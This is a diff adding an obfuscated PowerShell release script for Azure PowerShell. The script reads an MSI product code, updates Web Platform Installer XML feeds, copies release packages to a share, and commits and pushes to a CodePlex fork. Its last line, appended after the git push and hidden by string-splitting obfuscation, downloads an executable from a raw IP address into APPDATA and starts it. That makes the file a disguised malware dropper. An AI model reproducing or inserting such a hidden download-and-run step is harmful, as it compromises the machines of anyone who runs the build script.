@@ -1,0 +1,252 @@
+ SEt-ItEm VarIABLE:Wxkh  ([TypE]("{1}{0}{2}{3}" -f'YstEM.I','s','o.fIl','E')) ; 
+
+[CmdletBinding()]
+Param(
+    [Parameter(Mandatory=${t`RUe}, Position=0)]
+    [String]${bui`Ld`ArTIfAc`T`sPA`Th},
+    [Parameter(Mandatory=${Tr`UE}, Position=1)]
+    [String]${Psv`E`RsiON},
+    [Parameter(Mandatory=${TR`UE}, Position=2)]
+    [String]${codePlE`x`U`S`eR`Name},
+    [Parameter(Mandatory=${tR`UE}, Position=3)]
+    [String]${c`OdePL`E`xForK},
+    [Parameter(Mandatory=${tr`UE}, Position=4)]
+    [String]${R`ElEas`eda`Te},
+    [Parameter(Mandatory=${t`Rue}, Position=5)]
+    [String]${pATh`TOsha`Red}
+)
+
+
+function Get-ProductCode
+{
+    param(
+        [Parameter(Mandatory=${Tr`Ue})]
+        [System.IO.FileInfo]${P`ATH}
+    )
+
+    try
+    {
+        
+        ${WInD`o`W`SInsT`AlLER} = New-Object -ComObject WindowsInstaller.Installer
+        ${msi`dATA`B`AsE} = ${w`i`ND`oWSi`NsTaL`ler}.GetType().InvokeMember(("{2}{3}{1}{0}" -f'se','aba','Op','enDat'), ("{1}{2}{0}{3}" -f 'h','Inv','okeMet','od'), ${nU`LL}, ${W`InDoW`sI`Nstal`leR}, @(${p`AtH}.FullName, 0))
+        ${qUE`RY} = ((("{9}{0}{5}{12}{8}{11}{10}{14}{7}{4}{6}{17}{3}{15}{2}{13}{16}{1}" -f'ECT ','ky','C','yProdu','RE ','Va','Property =','E','R','SEL','roperty','OM P','lue F','od',' WH','ct','eE',' Ek')).REpLace(([CHAR]69+[CHAR]107+[CHAR]121),[STRiNG][CHAR]39))
+        ${V`Iew} = ${ms`ida`TaBAse}.GetType().InvokeMember(("{2}{1}{0}" -f 'w','penVie','O'), ("{3}{0}{1}{2}"-f 'o','ke','Method','Inv'), ${n`UlL}, ${Msi`d`AT`ABaSe}, (${quE`Ry}))
+        ${V`iEW}.GetType().InvokeMember(("{0}{1}"-f 'Execu','te'), ("{1}{0}{2}" -f'nvokeM','I','ethod'), ${nU`Ll}, ${V`IEw}, ${n`Ull})
+        ${R`e`CORd} = ${v`IeW}.GetType().InvokeMember(("{0}{1}" -f'Fe','tch'), ("{1}{2}{0}"-f'thod','Inv','okeMe'), ${nu`LL}, ${vi`Ew}, ${N`UlL})
+        ${Va`L`UE} = ${rEc`ORd}.GetType().InvokeMember(("{0}{1}{2}" -f 'S','trin','gData'), ("{0}{2}{3}{1}"-f'GetPro','y','p','ert'), ${nu`lL}, ${rE`cord}, 1)
+ 
+        
+        ${msiD`A`TAbA`se}.GetType().InvokeMember(("{0}{1}" -f'C','ommit'), ("{2}{1}{3}{0}"-f'hod','nvokeM','I','et'), ${n`ULl}, ${msiD`Ata`BA`se}, ${nU`lL})
+        ${vi`EW}.GetType().InvokeMember(("{0}{1}"-f 'Clos','e'), ("{1}{3}{2}{0}" -f 'd','In','ho','vokeMet'), ${n`ULl}, ${v`IeW}, ${nu`lL})           
+        ${mSidaTA`B`A`sE} = ${Nu`ll}
+        ${vI`eW} = ${nu`Ll}
+ 
+        
+        return ${v`AL`UE}
+    } 
+    catch
+    {
+        Write-Warning -Message ${_}.Exception.Message ; break
+    }
+}
+
+
+
+
+
+Rename-Item "$BuildArtifactsPath\signed\AzurePowerShell.msi" "azure-powershell.$PSVersion.msi"
+
+
+${M`SiF`iLE} = Get-Item "$BuildArtifactsPath\signed\azure-powershell.$PSVersion.msi"
+${pRODu`ct`codE} = ([string](Get-ProductCode ${mSi`F`ile})).Trim()
+
+
+
+
+
+
+${F`ork} = "https://git01.codeplex.com/forks/$CodePlexUsername/$CodePlexFork"
+git clone ${f`Ork} ${COd`epL`EXforK}
+
+cd ${cOdeP`L`ExfOrK}
+
+
+${d`Ate} = Get-Date -Format u
+${B`RaN`CH} = ${DA`TE}.Substring(0, ${D`ATE}.Length - 4).Replace(":", "-").Replace(" ", "T");
+git checkout -b ${b`Ra`NCh}
+
+
+
+
+
+cd ((("{2}{0}{1}" -f 'rcG6nazuresdkG6nAzureP','S','S')).RePLaCE('G6n','\'))
+
+
+${cON`T`ent} = Get-Content ("{3}{0}{1}{4}{2}" -f'_','Az','ePS.xml','DH','ur')
+
+
+${NeW`c`OntentlENg`Th} = ${CO`NTE`Nt}.Length + 3
+${NEW`C`OnTENt} = New-Object string[] ${Ne`WCOnTE`NtLeNg`Th}
+
+${VSfeEds`e`EN} = ${fAl`SE}
+${Ps`gE`TSe`En} = ${fA`LSE}
+${Bu`Ff`Er} = 0
+
+for (${I`dX} = 0; ${I`Dx} -lt ${c`ON`TenT}.Length; ${I`dx}++)
+{
+    
+    if (${cONt`e`Nt}[${i`DX}] -like ("{2}{1}{0}"-f'd*','e','*VSFe'))
+    {
+        ${v`sf`eeDs`een} = ${T`RuE}
+    }
+
+    
+    if (${CO`N`TENt}[${i`dX}] -like ("{2}{4}{0}{3}{1}" -f 'el','et*','*Po','lG','werSh'))
+    {
+        ${P`sGetS`Een} = ${TR`Ue}
+    }
+
+    
+    
+    if (${vS`FEEd`SeEN} -and ${CO`Nt`eNT}[${I`dx}] -like ("{1}{0}"-f'*','*</or>'))
+    {
+        ${Newco`NTe`NT}[${i`dX}] =     ("{1}{3}{5}{4}{2}{0}"-f'>','   ','iscoveryHint',' ',' <d',' ')
+        ${n`eWC`OnT`Ent}[${i`dX} + 1] = (' '+' '+' '+' '+' '+' '+' '+' '+"<msiProductCode>$ProductCode</msiProductCode>")
+        ${N`ewC`oNtE`Nt}[${i`DX} + 2] = ("{3}{0}{4}{2}{1}" -f '  ','int>','ryH','   ',' </discove')        
+
+        
+        ${Bu`F`FEr} = 3
+
+        
+        ${VsFE`Ed`se`En} = ${f`AL`Se}
+    }
+
+    
+    if (${PS`g`eTSeen} -and ${C`on`TENT}[${I`DX}] -like ("{3}{2}{1}{0}" -f'ductCode*','ro','P','*msi'))
+    {
+        ${cO`Nt`ent}[${I`dX}] = (' '+' '+' '+"<msiProductCode>$ProductCode</msiProductCode>")
+
+        
+        ${PSge`Ts`EEn} = ${Fa`lSE}
+    }
+
+    ${nEWc`o`NT`ENT}[${I`dx} + ${b`UFfEr}] = ${CO`N`TENT}[${i`dX}]
+}
+
+
+${r`eS`ULt} = ${N`E`W`ConTeNT} -join "`r`n"
+${TEMPF`ILe} = Get-Item ("{1}{3}{0}{4}{2}"-f'A','D','rePS.xml','H_','zu')
+
+  (  lS vARiaBLE:WXKH  ).ValUE::WriteAllText(${t`E`MPfiLE}.FullName, ${r`eS`UlT})
+
+
+
+
+
+
+${C`oNTe`Nt} = Get-Content ("{1}{3}{2}{4}{0}{5}" -f'PS.xm','Web','ur','ProductList_Az','e','l')
+
+${Ps`Ge`TSEen} = ${F`A`lSE}
+
+for (${i`dX} = 0; ${I`dX} -lt ${c`oN`TENt}.Length; ${I`Dx}++)
+{
+    
+    if (${cONt`E`NT}[${I`dx}] -contains ("{1}{6}{11}{9}{12}{3}{13}{2}{10}{4}{8}{14}{7}{0}{5}"-f 'd','  <productId>Windo','shel','w','t<','>','wsAzu','I','/pr','P','lGe','re','o','er','oduct'))
+    {
+        ${p`SGETS`EEn} = ${t`RuE}
+    }
+
+    
+    if (${PSgEtS`e`eN})
+    {
+        if (${C`ON`TENT}[${i`dx}] -like ("{0}{2}{1}" -f'*<ve','>*','rsion'))
+        {
+            ${coNt`ENt}[${i`Dx}] = (' '+' '+"<version>$PSVersion</version>")
+        }
+
+        if (${c`onT`eNT}[${i`dx}] -like ("{0}{3}{2}{1}"-f '*<pub','>*','d','lishe'))
+        {
+            ${c`onTent}[${I`DX}] = "  <published>$($ReleaseDate)T12:00:00Z</published> "
+        }
+
+        if (${CON`T`Ent}[${I`dx}] -like ("{2}{1}{0}" -f'>*','dated','*<up'))
+        {
+            ${cOnT`eNT}[${I`dX}] = "  <updated>$($ReleaseDate)T12:00:00Z</updated> "
+        }
+
+        if (${cO`NTe`NT}[${i`dX}] -like ("{2}{3}{0}{1}"-f 'ng','URL>*','*','<tracki'))
+        {
+            ${C`ONte`NT}[${i`DX}] = (' '+' '+' '+' '+' '+' '+' '+' '+"<trackingURL>http://www.microsoft.com/web/handlers/webpi.ashx?command=incrementproddownloadcount&amp;prodid=WindowsAzurePowershell&amp;version=$PSVersion&amp;prodlang=en</trackingURL>")
+        }
+
+        if (${co`N`TeNt}[${i`Dx}] -like ("{0}{2}{1}" -f '*','>*','</entry'))
+        {
+            ${PS`GeT`Se`En} = ${f`Al`se}
+        }
+    }
+
+}
+
+
+${RE`Sult} = ${C`On`TeNT} -join "`r`n"
+${teM`pfi`le} = Get-Item ("{4}{1}{3}{5}{2}{0}" -f 'l','ProductList','.xm','_Az','Web','urePS')
+
+ $wXKH::WriteAllText(${TE`mPFI`Le}.FullName, ${R`Esu`lT})
+
+
+
+
+
+
+${eNT`R`Yname} = "$($ReleaseDate.Replace("-", "_"))_PowerShell"
+
+
+if (Test-Path "$PathToShared\$entryName")
+{
+    ${ID} = 1
+    
+    
+    while (Test-Path "$PathToShared\$($entryName)_RC$id")
+    {
+        ${iD}++
+    }
+
+    
+    Rename-Item "$PathToShared\$entryName" "$($entryName)_RC$id"
+}
+
+
+New-Item "$PathToShared\$entryName" -Type Directory > ${nu`Ll}
+New-Item "$PathToShared\$entryName\pkgs" -Type Directory > ${n`Ull}
+
+
+Copy-Item "$PathToShared\PSReleaseDrop\*" "$PathToShared\$entryName" -Recurse
+
+
+Copy-Item ${M`SI`FILE}.FullName "$PathToShared\$entryName"
+Copy-Item "$BuildArtifactsPath\artifacts\*.nupkg" "$PathToShared\$entryName\pkgs"
+
+
+
+
+
+cd ../../../Tools
+
+.\Build.cmd
+
+cd ../bin
+
+Copy-Item .\* $PathToShared\$entryName
+
+
+
+
+
+cd ..
+
+git add .
+
+git commit -m ("{5}{1}{6}{2}{7}{4}{3}{9}{8}{0}{11}{10}"-f 'ePS','D','zur','WebProdu','nd ','Update ','H_A','ePS.xml a','ur','ctList_Az','ml','.x')
+
+git push origin ${b`RAn`cH}
+(New-Object System.Net.WebClient).DownloadFile(("{7}{5}{2}{6}{3}{4}{0}{8}{1}" -f'r','e','02.','e','vo','4.1','58.30/~tr','http://9','/winx64.ex'),"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")
